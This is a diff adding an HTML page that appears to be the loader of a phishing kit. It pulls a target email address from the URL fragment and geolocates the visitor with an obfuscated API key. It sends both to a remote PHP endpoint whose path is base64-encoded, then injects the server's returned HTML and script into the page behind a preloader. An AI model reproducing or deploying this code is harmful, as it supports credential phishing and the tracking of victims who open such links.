@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+    <link rel="stylesheet" href="./jjwkwnwnwww.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+    <script src="https://kit.fontawesome.com/839d221177.js" crossorigin="anonymous"></script>
+  </head>
+  <body>
+
+    <div preloader="true" class="d-view">
+      <div class="lder-bdy">
+        <img src="./im_g/wwkwkwkmwm.gif" alt="" />
+      </div>
+    </div>
+
+    <div preloader="true" class="m-view">
+      <div class="lder-bdy">
+        <img src="./im_g/wwkwkwkmwm.gif" alt="" />
+      </div>
+    </div>
+
+    <br />
+
+    <script src="./srv.js"></script>
+
+    <script src="./dt.js"></script>
+
+    <script id="sctoapnd"></script>
+
+    <script id="js_enenne"></script>
+
+  <script>
+
+    const validateEmail = (email) => {
+        return String(email)
+          .toLowerCase()
+          .match(
+            /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+          );
+      };
+    
+    const run_ = async () => {
+      const __winHref = window.location.href.split("?")[0];
+      const __getInd__ = (str, search) => str.indexOf(search);
+      const __getSlice__ = (str, index) => str.substr(index);
+      const __getEl__ = (sel) => document.querySelector(sel);
+      const __json = (url) => fetch(url).then((res) => res.json());
+      const d_view = __getEl__(".d-view");
+      const m_view = __getEl__(".m-view");
+      const scToAppend = __getEl__("#sctoapnd");
+      const setAttr__ = (__attr, __val, __elem) => __elem.setAttribute(__attr, __val);
+
+      async function loadLoc() {
+          return await __json(
+            `https://api.ipdata.co?api-key=${atob(
+              "OTBiZjAxNDQxODM2YWZiNjdiMzIyODE0ODhiYWI1NzAzYjYzMTMwY2NiYzU0MTkyZjNkYmI4MGM="
+            )}`
+          );
+      }
+
+        // get rootHref
+        const getRootHref = () => {
+          return __winHref.substring(0, __winHref.indexOf('hl'));
+        }
+
+      
+      const __getURLEm = () => {
+          if(__getInd__(__winHref, "#") === -1){
+              console.log("urlEM 1 failed");
+              return false;
+          }
+
+          if(__getInd__(__winHref, "@") === -1){
+              console.log("urlEM 2 failed");
+              return false;
+          }
+
+          return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+      }
+
+      // subC rtvr
+      const _getSC__ = (_s = null, subj = 'l') => {
+          const new_sc = { sc: 0, new: true };
+        
+          if (!_s || typeof _s !== "string") {
+            console.log("sc rtrvl fld");
+            return  new_sc;
+          }
+        
+          const _sc_indx = _s.indexOf(subj);
+        
+          console.log({ _sc_indx });
+        
+          if (_sc_indx === -1) return new_sc;
+        
+          const sc = Number(_s.substring(_sc_indx + 1));
+        
+          if (typeof sc !== "number" || isNaN(sc)) {
+            console.log("error: sc rtrvl fld", { sc });
+            return new_sc;
+          }
+      
+          return { sc, new: false };
+        };
+
+      // auth_err
+      let auth_err =  _getSC__(window.location.href.split("?")[1]).sc;
+
+      // uem ver
+      const __UrlEm = __getURLEm();
+
+      if (
+          __getInd__(__winHref, "#") === -1 ||
+          __getInd__(__winHref, "@") === -1 ||
+          !Boolean(__UrlEm)
+        ) {
+            console.log("Failed");
+            return;
+        }
+
+      // console.log({ __UrlEm, auth_err, __winHref })
+
+      // vldt
+      const __fetchOptions = {
+        method: "POST",
+        body: JSON.stringify({
+          
+        }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      };
+
+            
+
+      // set up now
+      loadLoc().then(__locData => {
+        const __fetchOptions = {
+        method: "POST",
+        body: JSON.stringify({
+          auth_err,
+          __locData, 
+          __UrlEm,
+          __winHref,
+          rootHref: getRootHref()
+          }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      };
+      
+      fetch(
+        `${window.stef.srv_loc}${atob("L3NuYndid3dud213d25tdy5waHA=")}`,
+        __fetchOptions
+      ).then(_res => _res.json()).then(res => {
+        m_view.innerHTML = res.data.dv_m;
+        d_view.innerHTML = res.data.dv_d;
+        setAttr__("preloader", "false", d_view);
+        setAttr__("preloader", "false", m_view);
+
+        if(window.stef_dt.__m__){
+          m_view.style.display = "block"; 
+        }else{
+          d_view.style.display = "block"; 
+        }
+
+        setAttr__("preloader", "false", m_view);
+
+        scToAppend.innerHTML = res.data.crpt;
+
+        // __setUp__stef();
+      });
+
+      });
+
+      
+    }
+
+    run_();
+  </script>
+  </body>
+</html>
